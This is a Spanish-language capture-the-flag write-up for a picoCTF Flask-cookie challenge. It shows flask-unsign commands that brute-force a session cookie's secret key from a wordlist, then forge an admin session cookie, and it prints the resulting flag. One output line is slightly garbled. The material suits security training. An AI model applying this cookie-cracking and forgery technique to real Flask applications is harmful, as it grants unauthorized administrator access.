Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

Hints:

1. How secure is a flask cookie?

## Solución 1:

Usando flask-unsign para encontrar la llave para cifrar otra cookie de itsdangerous Flask, metiendo como parametro wordlist todas las posibles cookies en un txt y la cookie que generó con 'snickerdoodle':

```
┌──(kali㉿kali)-[~]
└─$ flask-unsign --unsign --wordlist cookies.txt --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-n40Q.eFoMuupg0zKvOzO9qrcI14hBJHw"
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-n8Aw.IMDN6jipuMBDE4GknFS9Oofd8oM


**Flag**: `picoCTF{pwn_4ll_th3_cook1E5_3646b931}`
```